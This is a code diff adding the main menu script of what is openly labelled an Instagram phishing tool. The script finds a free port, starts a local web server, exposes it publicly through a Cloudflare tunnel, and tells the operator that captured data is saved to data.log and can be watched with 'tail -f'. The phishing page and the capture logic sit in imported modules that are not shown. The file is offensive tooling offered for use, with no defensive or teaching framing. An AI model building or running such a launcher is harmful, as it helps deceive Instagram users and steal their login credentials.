@@ -1,0 +1,43 @@
+import time
+import sys
+from colors import colored, Colors
+from utils import clear_screen, show_banner, view_logs, kill_previous_servers
+from server import find_free_port, start_web_server, wait_for_server
+from tunnel import start_cloudflare_tunnel
+from config import PORT_START, PORT_END
+
+def show_menu():
+    print(colored("[1] Start Instagram Phishing (Auto Tunnel)", Colors.YELLOW))
+    print(colored("[2] View Logs", Colors.BLUE))
+    print(colored("[3] Exit", Colors.RED))
+    print()
+
+def auto_start():
+    port = find_free_port(PORT_START, PORT_END)
+    if not port:
+        print(colored("[!] No free ports available in range {}–{}!".format(PORT_START, PORT_END), Colors.RED))
+        return
+    kill_previous_servers()
+    server = start_web_server(port)
+    if server is None:
+        return
+    # Wait for server to be ready
+    if wait_for_server(port, timeout=10):
+        url = start_cloudflare_tunnel(port)
+        if url:
+            print(colored(f"\n📁 Data will be saved in data.log\n", Colors.YELLOW))
+            print(colored(f"📁 View logs: tail -f data.log\n\n", Colors.YELLOW))
+            print(colored(f"[*] Press Ctrl+C to stop the server\n", Colors.RED))
+        else:
+            print(colored("\n[!] Cloudflare Tunnel failed to start.", Colors.RED))
+            print(colored("You can still access locally at: http://localhost:" + str(port), Colors.YELLOW))
+            print(colored("Try manually: cloudflared tunnel --url http://localhost:" + str(port), Colors.YELLOW))
+    else:
+        print(colored("[!] Server failed to start properly.", Colors.RED))
+        return
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(colored("\n\n[!] Server stopped by user\n", Colors.YELLOW))
+        kill_previous_servers()
